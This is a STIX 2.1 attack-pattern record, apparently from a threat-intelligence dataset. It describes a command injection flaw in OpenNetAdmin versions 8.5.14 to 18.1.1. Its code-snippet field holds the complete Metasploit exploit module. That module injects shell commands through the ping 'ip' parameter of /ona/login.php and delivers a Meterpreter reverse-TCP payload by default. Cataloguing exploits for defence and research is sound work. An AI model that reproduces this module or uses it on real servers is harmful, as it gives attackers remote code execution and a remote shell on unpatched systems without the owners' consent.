{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3d731add-4596-45a6-ab01-da5a19884bc3",
    "created": "2024-08-14T17:12:19.663121Z",
    "modified": "2024-08-14T17:12:19.663125Z",
    "name": "OpenNetAdmin Ping Command Injection",
    "description": " This module exploits a command injection in OpenNetAdmin between 8.5.14 and 18.1.1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/opennetadmin_ping_cmd_injection.rb",
            "external_id": "opennetadmin_ping_cmd_injection.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'OpenNetAdmin Ping Command Injection',\n      'Description'     => %q{\n        This module exploits a command injection in OpenNetAdmin between 8.5.14 and 18.1.1.\n      },\n      'Author'          =>\n        [\n          'mattpascoe', # Vulnerability discovery and exploit\n          'Onur ER <onur@onurer.net>' # Metasploit module\n        ],\n      'References'      =>\n        [\n          ['EDB', '47691']\n        ],\n      'DisclosureDate'  => '2019-11-19',\n      'License'         => MSF_LICENSE,\n      'Platform'        => 'linux',\n      'Arch'            => [ARCH_X86, ARCH_X64],\n      'Privileged'      => false,\n      'Targets'         =>\n        [\n          ['Automatic Target', {}]\n        ],\n      'DefaultOptions'  =>\n        {\n          'RPORT'   => 80,\n          'payload' => 'linux/x86/meterpreter/reverse_tcp'\n        },\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        OptString.new('VHOST', [false, 'HTTP server virtual host']),\n        OptString.new('TARGETURI', [true, 'Base path', '/ona/login.php'])\n      ]\n    )\n    deregister_options('CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    res = send_request_cgi({\n      'method'        => 'POST',\n      'uri'           => normalize_uri(target_uri.path),\n      'ctype'         => 'application/x-www-form-urlencoded',\n      'encode_params' => false,\n      'vars_post'     => {\n        'xajax'       => 'window_open',\n        'xajaxargs[]' => 'app_about'\n      }\n     })\n\n    unless res\n      return CheckCode::Unknown 'Connection failed'\n    end\n\n    unless res.body =~ /OpenNetAdmin/i\n      return CheckCode::Safe\n    end\n\n    opennetadmin_version = res.body.scan(/OpenNetAdmin - v([\\d\\.]+)/).flatten.first\n    version = Rex::Version.new(opennetadmin_version)\n\n    if version\n      vprint_status \"OpenNetAdmin version #{version}\"\n    end\n\n    if version.between?(Rex::Version.new('8.5.14'), Rex::Version.new('18.1.1'))\n      return CheckCode::Appears\n    end\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    print_status('Exploiting...')\n    execute_cmdstager(flavor: :printf)\n  end\n\n  def execute_command(cmd, opts = {})\n    begin\n      send_request_cgi({\n        'method'        => 'POST',\n        'uri'           => normalize_uri(target_uri.path),\n        'ctype'         => 'application/x-www-form-urlencoded',\n        'encode_params' => false,\n        'vars_post'     => {\n          'xajax'       => 'window_submit',\n          'xajaxargs[]' => ['tooltips', \"ip=>;#{CGI.escape(cmd)};\", 'ping']\n        }\n      })\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-11-19",
    "x_mitre_platforms": [
        "linux'"
    ]
}